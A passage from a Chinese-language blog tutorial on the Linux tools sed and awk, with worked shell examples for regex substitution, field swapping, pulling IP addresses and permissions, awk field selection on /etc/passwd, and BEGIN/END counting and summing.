title="1.把数据规则化(比如每行用括号括起来)"></a>1.把数据规则化(比如每行用括号括起来)</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">原始内容：</span><br><span class="line">101 beijing</span><br><span class="line">102 shanghai</span><br><span class="line">103 fangcheng</span><br><span class="line">104 sanming</span><br><span class="line">105 chongqing</span><br><span class="line">106 tianjing</span><br><span class="line">107 jiangsu</span><br><span class="line">108 beihai</span><br><span class="line">如果想要用括号把每行的数据一次性都括起来，则可以使用：</span><br><span class="line">sed -r  &#x27;s#(.*)#&lt;\1&gt;#g&#x27; 123123.txt    #其中，小括号是为了保护数据内容，.*是匹配所有内容，\1就是第一个括号的内容</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205090059237.png" alt="image-20220509005949140"></p><h3 id="2-调换位置"><a href="#2-调换位置" class="headerlink" title="2.调换位置"></a>2.调换位置</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">原始内容：</span><br><span class="line">101 beijing</span><br><span class="line">102 shanghai</span><br><span class="line">103 fangcheng</span><br><span class="line">104 sanming</span><br><span class="line">105 chongqing</span><br><span class="line">106 tianjing</span><br><span class="line">107 jiangsu</span><br><span class="line">108 beihai</span><br><span class="line">如果想要把前后数据调换位置：</span><br><span class="line">sed -r &#x27;s#(.*) (.*)#\2 \1#g&#x27; 123123.txt</span><br><span class="line">或者</span><br><span class="line">sed -r &#x27;s#([0-9]*) ([a-Z]*)#\2 \1#g&#x27; 123123.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205090109068.png" alt="image-20220509010955990"></p><h3 id="3-取ip地址"><a href="#3-取ip地址" class="headerlink" title="3.取ip地址"></a>3.取ip地址</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">显示某一个指定网卡的命令是：</span><br><span class="line">ip a s eth0     # ip address show eth0</span><br><span class="line">取ip地址就是：</span><br><span class="line">ip a s eth0|sed -n &#x27;3p&#x27;|sed -r &#x27;s#.*t (.*)/.*#IP:\1#g&#x27;</span><br><span class="line">精简一下就：</span><br><span class="line">ip a s eth0|sed -rn &#x27;3s#.*t (.*)/.*#IP:\1#gp&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205090129844.png" alt="image-20220509012908749"></p><h3 id="4-取权限644"><a href="#4-取权限644" class="headerlink" title="4.取权限644"></a>4.取权限644</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">stat /etc/hosts                                                                                                                                                                                           1 ⨯</span><br><span class="line">  文件：/etc/hosts</span><br><span class="line">  大小：184             块：8          IO 块：4096   普通文件</span><br><span class="line">设备：801h/2049d        Inode：2621721     硬链接：1</span><br><span class="line">权限：(0644/-rw-r--r--)  Uid：(    0/    root)   Gid：(    0/    root)</span><br><span class="line">最近访问：2022-05-08 03:38:47.024672339 -0400</span><br><span class="line">最近更改：2021-05-30 17:09:30.474899032 -0400</span><br><span class="line">最近改动：2021-05-30 17:09:30.474899032 -0400</span><br><span class="line">创建时间：2021-05-30 17:09:29.550899058 -0400</span><br><span class="line"></span><br><span class="line">取权限644：</span><br><span class="line">stat /etc/hosts |sed -nr &#x27;4s#.*0(.*)/-.*#\1#gp&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205090139329.png" alt="image-20220509013952225"></p><p>这里说一下其实stat就是有想要的内容了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stat -c%a /etc/hosts   #命令结果有想要的内容或不想要的内容，先别急着用管道，我先看看命令帮助</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205090141726.png" alt="image-20220509014145638"></p><h3 id="i"><a href="#i" class="headerlink" title="-i"></a>-i</h3><p>修改文件内容，不加-i默认只是预览(<strong>需要注意的是参数需要按顺序，比如ir就是先写入然后再支持扩展正则，这是不对的，必须要先支持扩展正则再写入</strong>)</p><h3 id="i-bak"><a href="#i-bak" class="headerlink" title="-i.bak"></a>-i.bak</h3><p>备份文件并原处编辑</p><p>把文件备份到bak之后修改源文件为指定格式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -r -i.bak &#x27;s#([0-9]*) ([a-Z]*)#\2 \1#g&#x27; 123123.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205090154191.png" alt="image-20220509015411066"></p><h2 id="sed的一些暂时看不懂的操作命令"><a href="#sed的一些暂时看不懂的操作命令" class="headerlink" title="sed的一些暂时看不懂的操作命令"></a>sed的一些暂时看不懂的操作命令</h2><h3 id="显示行号-其实应该就是替换的操作"><a href="#显示行号-其实应该就是替换的操作" class="headerlink" title="显示行号(其实应该就是替换的操作)"></a>显示行号(其实应该就是替换的操作)</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sed = 231.txt | sed &#x27;N;s/\n/:/&#x27;# 在231.txt的每行开始添加行号，就是每次匹配到一个换行就加个冒号，也不知道啥意思</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;cat 231.txt</span></span><br><span class="line">root</span><br><span class="line">roooot</span><br><span class="line">rot</span><br><span class="line">rooooot</span><br><span class="line">Root</span><br><span class="line">ROOT</span><br><span class="line">123ssss</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;sed = 231.txt | sed <span class="string">&#x27;N;s/\n/:/&#x27;</span></span></span><br><span class="line">1:root</span><br><span class="line">2:roooot</span><br><span class="line">3:rot</span><br><span class="line">4:rooooot</span><br><span class="line">5:Root</span><br><span class="line">6:ROOT</span><br><span class="line">7:123ssss</span><br></pre></td></tr></table></figure><p>如果想要查询包含root的(不区分大小写)并且显示行号，则</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;sed = 231.txt | sed &#x27;N;s/\n/:/&#x27; |sed -n &#x27;/root/Ip&#x27; </span><br><span class="line">1:root</span><br><span class="line">5:Root</span><br><span class="line">6:ROOT</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>证明一下为什么我会说显示行号就是替换操作</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;sed = 231.txt | sed <span class="string">&#x27;N;s/\n/:/&#x27;</span> |sed -n <span class="string">&#x27;/^root/Ip&#x27;</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 然后什么都没输出，说明没有开头是root的行</span></span><br></pre></td></tr></table></figure><p>更多sed操作内容看<a href="https://blog.51cto.com/leyin01/1704626">这里</a></p><p><strong>sed [option] ‘script’ inputfile</strong></p><blockquote><p>1.选项</p><ul><li>-n 不输出模式空间内容到屏幕，即不自动打印</li><li>-e 多点编辑</li><li>-f /PATH/SCRIPT_FILE: 从指定文件中读取编辑脚本</li><li>-r 支持使用扩展正则表达式</li><li>-i 直接编辑文件</li><li>-i.bak 备份文件并原处编辑</li></ul><p>2.script 地址定界</p><ul><li><p>不给地址：对全文进行处理</p></li><li><p>单地址：</p><p><code>#</code>: 指定的行，$：最后一行<br><code>/pattern/</code>：被此处模式所能够匹配到的每一行</p></li><li><p>地址范围：</p><p><code>#,#</code><br><code>#,+#</code><br><code>/pat1/,/pat2/</code><br>`#,/pat1/</p></li><li><p>~：步进</p><p>1~2 奇数行</p><p>2~2 偶数行</p></li></ul><p>3.编辑命令：</p><ul><li><p><code>d</code> 删除模式空间匹配的行，并立即启用下一轮循环</p></li><li><p><code>p</code> 打印当前模式空间内容，追加到默认输出之后</p></li><li><p><code>a [\]text1</code> 在指定行后面追加文本,支持使用\n实现多行追加</p></li><li><p><code>i [\]text</code> 在行前面插入文本</p></li><li><p><code>c [\]text</code> 替换行为单行或多行文本</p></li><li><p><code>w /path/somefile</code> 保存模式匹配的行至指定文件</p></li><li><p><code>r /path/somefile</code> 读取指定文件的文本至模式空间中匹配到的行后</p></li><li><p><code>=</code> 为模式空间中的行打印行号</p></li><li><p><code>!</code> 模式空间中匹配行取反处理</p></li><li><p>s///：查找替换,支持使用其它分隔符，s@@@，s###</p><p>替换标记：</p><ul><li><code>g</code> 行内全局替换</li><li><code>p</code> 显示替换成功的行</li><li><code>w /PATH/TO/SOMEFILE</code> 将替换成功的行保存至文件中</li></ul></li></ul></blockquote><p>1.打印出文件第二行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> cat testzhengze.txt</span></span><br><span class="line">linux</span><br><span class="line">alan</span><br><span class="line">liinux</span><br><span class="line">jason</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> sed -n 2p testzhengze.txt</span> </span><br><span class="line">alan</span><br></pre></td></tr></table></figure><p>2.打印出文件第二行到第四行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> sed -n 2,4p testzhengze.txt</span></span><br><span class="line">alan</span><br><span class="line">liinux</span><br><span class="line">jason</span><br></pre></td></tr></table></figure><p>3.文件中的nux全部替换为abc</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> sed -i s/nux/abc/g testzhengze.txt</span> </span><br><span class="line"><span class="meta">#</span><span class="bash"> cat testzhengze.txt</span>               </span><br><span class="line">liabc</span><br><span class="line">alan</span><br><span class="line">liiabc</span><br><span class="line">jason</span><br></pre></td></tr></table></figure><p>直接修改读取的文件内容，而不是输出到终端。<br>s ：取代，可以直接进行取代的工作。</p><p>g: 是全局的意思。其中#是格式符，他也可以是@或者别的/。</p><p>Sed替换格式是：sed -i ‘s/要替换的内容/替换成的内容/g’ 文件名。</p><h2 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h2><table><thead><tr><th align="center">awk</th></tr></thead><tbody><tr><td align="center">一门类似于C的语言</td></tr><tr><td align="center">过滤，统计，与计算有关</td></tr><tr><td align="center">过滤，统计日志</td></tr></tbody></table><p>awk的流程大致如下：可以看到在读取文件之前的begin就可以执行命令了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205091342593.png" alt="image-20220509134224422"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 简单的执行操作就是</span></span><br><span class="line">-F可以指定分隔符，默认是空格，尝试一下分隔符为逗号的</span><br><span class="line">先把123123.txt的空格替换成逗号&quot;,&quot;</span><br><span class="line">sed -ri &#x27;s#[ ]#,#g&#x27; 123123.txt</span><br><span class="line">然后内容就是</span><br><span class="line">cat 123123.txt                </span><br><span class="line">beijing,101</span><br><span class="line">shanghai,102</span><br><span class="line">fangcheng,103</span><br><span class="line">sanming,104</span><br><span class="line">chongqing,105</span><br><span class="line">tianjing,106</span><br><span class="line">jiangsu,107</span><br><span class="line">beihai,108</span><br><span class="line"></span><br><span class="line">然后想要打印里面的城市名称则可以：</span><br><span class="line">awk -F, &#x27;BEGIN&#123;print &quot;name&quot;&#125;&#123;print $1&#125;END&#123;print &quot;END&quot;&#125;&#x27; 123123.txt   #在—F后面加分隔符就行了</span><br><span class="line">这里是默认按照逗号来分隔的，第一列就是城市的名称，第二列就是序号，然后BEGIN和END都可以加内容，也可以指定显示某行</span><br><span class="line">awk -F, &#x27;BEGIN&#123;print &quot;name&quot;&#125;NR==2&#123;print $1&#125;END&#123;print &quot;END&quot;&#125;&#x27; 123123.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205091406236.png" alt="image-20220509140659125">取行</p><h3 id="行与列"><a href="#行与列" class="headerlink" title="行与列"></a>行与列</h3><table><thead><tr><th>名词</th><th>awk中的叫法</th><th>一些说明</th></tr></thead><tbody><tr><td>行</td><td>记录 record</td><td>每一行默认通过回车来分割</td></tr><tr><td>列</td><td>字段，域 field</td><td>每一列默认通过空格分割</td></tr><tr><td>awk中行和列结束标记都可以修改</td><td></td><td></td></tr></tbody></table><p>awk的内置变量</p><table><thead><tr><th>内置变量</th><th></th><th></th></tr></thead><tbody><tr><td>NR</td><td>Number of Record 记录号，行号</td><td></td></tr><tr><td>NF</td><td>Number of Field 每行有多少个字段 $NF表示最后列</td><td></td></tr><tr><td>FS</td><td>-F:    ===-v FS=:      Field Separator 字段分隔符，每个字段结束标记,<strong>支持正则与扩展正则</strong></td><td></td></tr><tr><td>OFS</td><td>Output Field Separator 输出字段分隔符(awk显示每一列的时候每一列之间通过什么分割，默认是空格)</td><td></td></tr></tbody></table><ul><li>取行</li></ul><table><thead><tr><th>常用的awk条件</th><th></th><th></th></tr></thead><tbody><tr><td>NR==1</td><td>取出某1行</td><td></td></tr><tr><td>NR&gt;=1&amp;&amp;NR&lt;=5</td><td>取出1到5行范围</td><td></td></tr><tr><td>/root/</td><td>过滤</td><td></td></tr><tr><td>/103/,/107/</td><td>过滤内容范围</td><td></td></tr><tr><td>符号</td><td>&gt; 、&lt; 、&gt;=、 &lt;=、 ==、 !=</td><td></td></tr></tbody></table><p>过滤出2到5行</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205091428002.png" alt="image-20220509142815916"></p><p>过滤102到106的内容</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205091430211.png" alt="image-20220509143000136"></p><ul><li>取列</li></ul><p>-F表示指定分隔符，即指定每一列结束标记(默认空格，连续的空格，tab键)</p><p>$数字表示取出该数字指定的列</p><p>$0表示整行</p><p>$NF 表示最后一列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">ls -l |awk &#x27;print&#123;$1&#125;&#x27;</span><br><span class="line">总用量</span><br><span class="line">-rw-r--r--</span><br><span class="line">-rw-r--r--</span><br><span class="line">-rw-r--r--</span><br><span class="line">-rw-r--r--</span><br><span class="line">-rw-r--r--</span><br><span class="line">-rw-r--r--</span><br><span class="line">-rw-r--r--</span><br><span class="line">-rw-r--r--</span><br><span class="line">drwxr-xr-x</span><br><span class="line">drwxr-xr-x</span><br><span class="line">drwxr-xr-x</span><br><span class="line">drwxr-xr-x</span><br><span class="line">drwxr-xr-x</span><br><span class="line">drwxr-xr-x</span><br><span class="line">drwxr-xr-x</span><br><span class="line">drwxr-xr-x</span><br><span class="line">-rw-r--r--</span><br><span class="line">-rw-r--r--</span><br><span class="line">-rw-r--r--</span><br><span class="line">drwxr-xr-x</span><br><span class="line">-rw-------</span><br><span class="line">-rw-r--r--</span><br><span class="line">-rw-r--r--</span><br><span class="line"></span><br><span class="line">也可以取整行</span><br><span class="line">ls -l | awk   &#x27;NR==2&#123;print $0&#125;&#x27;</span><br><span class="line">-rw-r--r--  1 root root      12  5月  8 09:10 111.txt</span><br><span class="line">或者取某列跟某列</span><br><span class="line">ls -l |awk &#x27;&#123;print $5,$9&#125;&#x27; |column -t     #column -t 把内容对齐</span><br><span class="line"></span><br><span class="line">12       111.txt</span><br><span class="line">44       123123123.txt</span><br><span class="line">101      123123.txt</span><br><span class="line">101      123123.txt.bak</span><br><span class="line">94       123.txt</span><br><span class="line">1162     12.txt</span><br><span class="line">13       1.txt</span><br><span class="line">165      231.txt</span><br><span class="line">4096     公共</span><br><span class="line">4096     模板</span><br><span class="line">4096     视频</span><br><span class="line">4096     图片</span><br><span class="line">4096     文档</span><br><span class="line">4096     下载</span><br><span class="line">4096     音乐</span><br><span class="line">4096     桌面</span><br><span class="line">96       config.txt</span><br><span class="line">73802    demo01.exe</span><br><span class="line">73802    demo.exe</span><br><span class="line">4096     dvcs-ripper</span><br><span class="line">3501200  notepad++.exe</span><br><span class="line">33       password.txt</span><br><span class="line">27       user.txt</span><br><span class="line"></span><br><span class="line">不知道最后一列是第几列的话就用NF</span><br><span class="line">ls -l |awk &#x27;&#123;print $5,$NF&#125;&#x27; |column -t</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205091501865.png" alt="image-20220509150109739"></p><p>也可以在中间添加一些什么内容</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205091503804.png" alt="image-20220509150318716"></p><p>如果想要保留分隔符或者替换分隔符，就要用到-v OFS</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F: -v OFS=, &#x27;&#123;print $1,$2,$3,$4$NF&#125;&#x27; /etc/passwd |column -t</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205091509405.png" alt="image-20220509150912289"></p><h3 id="取出ip地址"><a href="#取出ip地址" class="headerlink" title="取出ip地址"></a>取出ip地址</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ip a s eth0 |awk -F&quot;[ /]+&quot; &#x27;NR==3&#123;print $3&#125;&#x27;   #满足NR==3才print</span><br><span class="line">192.168.29.137</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="模式匹配"><a href="#模式匹配" class="headerlink" title="模式匹配"></a>模式匹配</h3><ul><li>谁可以作为awk的条件</li></ul><table><thead><tr><th>awk</th><th>-F”[ /]+”</th><th>‘NR==3{print $3}’</th></tr></thead><tbody><tr><td>命令</td><td>选项</td><td>‘条件{动作}’</td></tr><tr><td></td><td></td><td>‘找谁{干啥}’</td></tr><tr><td></td><td></td><td>‘模式{动作}’</td></tr><tr><td></td><td></td><td>‘pattern{action}’</td></tr></tbody></table><ul><li>比较符号：&gt;、&lt;、&gt;=、&lt;=、==、!=</li><li>正则</li><li>范围 表达式</li><li>特殊条件：BEGIN和END</li></ul><h4 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h4><ul><li>// 支持扩展正则</li><li>awk可以精确到某一列，某一列中包含或不包含内容：波浪线”~”</li><li>“~”包含</li><li>“!~”不包含</li></ul><table><thead><tr><th>正则</th><th>awk正则</th><th></th></tr></thead><tbody><tr><td>^  表示以…开头的行</td><td>某一列的开头  $3~/^root/</td><td></td></tr><tr><td>$  表示以…结尾的行</td><td>某一列的结尾  $3~/root$/</td><td></td></tr><tr><td>^$ 表示空行</td><td>某一列是空的  很少用</td><td></td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">显示第三列以1开头的内容</span></span><br><span class="line">awk -F: &#x27;$3~/^1/&#x27; /etc/passwd</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">mysql:x:104:110:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">tss:x:105:111:TPM software stack,,,:/var/lib/tpm:/bin/false</span><br><span class="line">strongswan:x:106:65534::/var/lib/strongswan:/usr/sbin/nologin</span><br><span class="line">ntp:x:107:112::/nonexistent:/usr/sbin/nologin</span><br><span class="line">messagebus:x:108:113::/nonexistent:/usr/sbin/nologin</span><br><span class="line">redsocks:x:109:114::/var/run/redsocks:/usr/sbin/nologin</span><br><span class="line">rwhod:x:110:65534::/var/spool/rwho:/usr/sbin/nologin</span><br><span class="line">iodine:x:111:65534::/run/iodine:/usr/sbin/nologin</span><br><span class="line">miredo:x:112:65534::/var/run/miredo:/usr/sbin/nologin</span><br><span class="line">_rpc:x:113:65534::/run/rpcbind:/usr/sbin/nologin</span><br><span class="line">usbmux:x:114:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class="line">tcpdump:x:115:121::/nonexistent:/usr/sbin/nologin</span><br><span class="line">rtkit:x:116:122:RealtimeKit,,,:/proc:/usr/sbin/nologin</span><br><span class="line">sshd:x:117:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">statd:x:118:65534::/var/lib/nfs:/usr/sbin/nologin</span><br><span class="line"></span><br><span class="line">注意这里加不加&#123;&#125;，是有区别的</span><br><span class="line"> awk -F: &#x27;&#123;print $3~/^1/&#125;&#x27; /etc/passwd#有&#123;&#125;则表示该列里面是否包含开头为1的内容，如果该行的列不符合，则输出0，符合则输出1</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205091538496.png" alt="image-20220509153830355"></p><p>可以看到符合1开头有第二行、第十一行和第十二行…</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205091539692.png" alt="image-20220509153933583"></p><p>加了花括号输出结果是这样的，符合条件输出1，不符合输出0</p><p><strong>不加花括号是条件，加花括号表示动作</strong></p><h4 id="找出第三列以2开头的行，并显示第一列第三列和最后一列"><a href="#找出第三列以2开头的行，并显示第一列第三列和最后一列" class="headerlink" title="找出第三列以2开头的行，并显示第一列第三列和最后一列"></a>找出第三列以2开头的行，并显示第一列第三列和最后一列</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">awk -F: &#x27;$3~/^2/&#123;print $1,$3,$NF&#125;&#x27; /etc/passwd</span><br><span class="line">bin 2 /usr/sbin/nologin</span><br></pre></td></tr></table></figure><h4 id="取范围"><a href="#取范围" class="headerlink" title="//,//取范围"></a>//,//取范围</h4><p>取范围的话在演示行与列的时候就试过了，这里尝试一下取范围之后再取指定的列awk</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">awk -F: &#x27;/102/,/105/&#123;print $NF&#125;&#x27; /etc/passwd</span><br><span class="line">/usr/sbin/nologin</span><br><span class="line">/usr/sbin/nologin</span><br><span class="line">/bin/false</span><br><span class="line">/bin/false</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>企业取范围查看内容一般就是取时间范围，然后取状态码、url、ip</p><h4 id="特殊模式BEGIN-和END"><a href="#特殊模式BEGIN-和END" class="headerlink" title="特殊模式BEGIN{}和END{}"></a>特殊模式BEGIN{}和END{}</h4><table><thead><tr><th>模式</th><th>含义</th><th>应用场景</th></tr></thead><tbody><tr><td>BEGIN{}</td><td>里面内容会在awk<strong>读取文件之前</strong>执行</td><td>1)进行简单统计、计算，不涉及读取文件(常见)<br/>2)用来处理文件之前添加表头<br/>3)用来定义awk变量(很少用，因为可以用-v)</td></tr><tr><td>END{}</td><td>里面内容会在awk<strong>读取文件之后</strong>执行</td><td>1)awk进行统计，一般过程:先进行计算，再END输出结果<br/>2)awk使用数组，用来输出数组结果</td></tr></tbody></table><ul><li>END{}统计计算:</li><li>统计方法</li></ul><table><thead><tr><th>统计方法</th><th>简写</th><th>应用场景</th></tr></thead><tbody><tr><td>i=i+1</td><td>i++</td><td>计数，统计次数</td></tr><tr><td>sum=sum+???</td><td>sum+=???</td><td>求和，累加</td></tr><tr><td>array[]=array[]+1</td><td>array[]++</td><td>数组分类计数</td></tr><tr><td>注意，i和sum都是变量</td><td></td><td></td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 统计空行个数</span></span><br><span class="line">awk &#x27;/^$/&#123;i++&#125;END&#123;print i&#125;&#x27; /etc/services</span><br><span class="line">6</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 统计列的总和sum</span></span><br><span class="line">seq 100 | awk &#x27;&#123;sum=sum+$1&#125;END&#123;print sum&#125;&#x27;</span><br><span class="line">5050</span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果想知道打印的过程</span></span><br><span class="line">seq 100 | awk &#x27;&#123;sum=sum+$1;print sum&#125;END&#123;print sum&#125;&#x27;</span><br><span class="line">1</span><br><span class="line">3</span><br><span class="line">6</span><br><span class="line">10</span><br><span 